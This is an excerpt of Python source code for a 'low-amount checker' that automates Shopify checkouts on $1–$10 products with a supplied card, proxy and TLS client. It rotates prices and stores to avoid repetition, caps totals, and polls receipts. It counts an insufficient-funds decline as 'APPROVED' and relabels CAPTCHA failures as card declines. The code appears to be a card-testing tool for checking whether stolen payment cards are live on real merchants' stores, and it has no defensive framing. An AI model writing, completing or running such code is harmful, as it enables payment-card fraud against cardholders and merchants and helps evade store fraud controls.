...
# ══════════════════════════════════════════════════════════════════════
# LOW-AMOUNT CHECKER  (price-range variant selection + shuffle)
# ══════════════════════════════════════════════════════════════════════

from typing import Dict as _Dict, List as _List

_recent_prices: _Dict[str, _List[str]] = {}


def shuffle_pick_variant(variants: list, domain: str) -> dict:
    """Pick a variant, preferring prices not used recently (last 5 per domain)."""
    if len(variants) <= 1:
        return variants[0]
    recent   = _recent_prices.get(domain, [])
    preferred = [v for v in variants if v["price"] not in recent]
    pick     = random.choice(preferred) if preferred else random.choice(variants)
    recent   = list(recent)
    recent.append(pick["price"])
    if len(recent) > 5:
        recent = recent[-5:]
    _recent_prices[domain] = recent
    return pick


def find_variant_in_range(
    client: "TLSClient",
    shop_url: str,
    price_min: float = 1.0,
    ...
    """
    Fetch products.json and return (variant_id, price_str) for a variant
    whose price is in [price_min, price_max].  Uses shuffle_pick_variant
    so the same price isn't reused back-to-back.

    Raises Exception when no matching variants are found.
    """
    ...
    while True:
        for attempt in range(3):
            ...
            if resp.status_code in (503, 502, 429, 500) and attempt < 2:
                ...
                continue
            raise Exception(
                f"GET products.json page {page} returned {resp.status_code}"
            )
        ...
        for p in products:
            for v in p.get("variants", []):
                if v.get("available") is False:
                    continue
                if v.get("inventory_quantity", 1) <= 0:
                    continue
                try:
                    p_val = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price_min <= p_val <= price_max:
                    candidates.append(
                        {"variant_id": str(v["id"]), "price": v["price"]}
                    )
        page += 1

    if not candidates:
        raise Exception(
            f"No variants in ${price_min:.2f}–${price_max:.2f} range at {shop_url}"
        )

    selected = shuffle_pick_variant(candidates, domain)
    return selected["variant_id"], selected["price"]


def run_checkout_low(
    shop_url: str,
    card_entry: str,
    proxy_url: str = "",
    price_min: float = 1.0,
    price_max: float = 10.0,  # $1–$10 product range for wider store coverage
    total_cap: float = 15.0,  # abort if shipping+tax pushes total above this
) -> "CheckResult":
    """
    Full Shopify checkout using a price-range-filtered variant.
    Product range $1–$10 gives good site coverage.  After shipping and tax
    are added the proposal total is checked against total_cap ($15 max).
    If it exceeds the cap the attempt is aborted and flagged retryable so
    the caller can switch to a different store.
    """
    site_name = shop_url.replace("https://", "").replace("http://", "")
    currency  = "USD"
    country   = "US"
    ...
    try:
        # ── Step 0: price-range variant selection ─────────────────────
        try:
            variant_id, price = find_variant_in_range(
                client, shop_url, price_min, price_max
            )
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
        ...
        # ── Step 9: PCI session (card vaulting) ───────────────────────
        try:
            ident_sig    = extract_identification_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            ...
            if not pci_session_id:
                _fallback = (
                    "https://checkout.pci.shopifycs.com/sessions"
                    if "shopifyinc" in (vault_url or "")
                    else "https://checkout.pci.shopifyinc.com/sessions"
                )
                _, pci_body = send_pci_session(
            ...
            if not pci_session_id:
                raise Exception(
                    f"could not extract session ID (body: {pci_body[:120]})"
                )
        except Exception as e:
            result.error = Exception(f"Step 9 failed: {e}")
            return result
        ...
        try:
            ...
            # ── Total cap guard ───────────────────────────────────────────
            # Shipping + tax can push the total above $10.  If so, abort
            # and signal the caller to retry on a different (cheaper) store.
            try:
                total_float = float(total_amount)
            except (ValueError, TypeError):
                total_float = 0.0
            if total_float > total_cap:
                result.retryable = True
                result.error = Exception(
                    f"Total ${total_float:.2f} exceeds cap ${total_cap:.2f} "
                    f"(product ${price}, shipping ${shipping_amount}) — retry cheaper store"
                )
                return result

            result.amount = total_amount  # show the real charge amount (incl. shipping+tax)

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount

            for _tax_attempt in range(1, 4):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
            ...
            if not receipt_id:
                ...
                if error_msg:
                    ...
                    result.status    = CheckStatus.ERROR
                    result.error     = Exception(
                        "Step 10 failed: could not extract receiptId or error message"
                    )
                    result.retryable = True
                return result
        ...
        # ── Step 11: poll for receipt ─────────────────────────────────
        _poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        _type_name_re  = re.compile(
            r'"__typename"\s*:\s*"'
            r'(ProcessingReceipt|FailedReceipt|SuccessfulReceipt'
            r'|ProcessedReceipt|ActionRequiredReceipt)"'
        )
        ...
        for poll_num in range(1, 31):
            try:
                ...
                receipt_type = ""
                m = _type_name_re.search(poll_body)
                if m:
                    receipt_type = m.group(1)
                result.status_code = extract_receipt_status_code(
                    poll_body, receipt_type
                )
                ...
                if receipt_type == "FailedReceipt":
                    error_code = ""
                    _err_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    me = _err_re.search(poll_body)
                    if me:
                        error_code = me.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status      = CheckStatus.APPROVED
                ...
                delay = 500
                md = _poll_delay_re.search(poll_body)
                if md:
                    try:
                        d = int(md.group(1))
                        if d > 0:
